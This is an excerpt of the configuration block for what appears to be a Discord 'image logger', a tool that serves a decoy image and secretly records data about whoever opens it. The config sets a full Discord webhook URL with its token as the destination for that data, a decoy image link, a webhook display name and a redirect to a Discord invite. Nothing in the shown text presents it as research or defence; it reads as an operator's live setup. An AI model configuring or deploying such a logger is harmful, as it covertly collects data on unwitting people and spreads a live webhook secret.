...
config = {
    # BASE CONFIG #
    "webhook": "https://canary.discord.com/api/webhooks/1377440406618505288/EtwxpJT56RyHwt4MUvM7u-jLQrn4eoRSxpAYbews-uwoNS8s_T_JxmWWYDqnYjstRbOl",
    "image": "https://images.app.goo.gl/Hagr6vSSftL73Atc8", #You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "red circle ", # Set this to the name you want the webhook to have
    ...
    "redirect": {
        ...
        "page": "https://discord.gg/Hmax5etQ" # Link to the webpage to redirect to 
    },
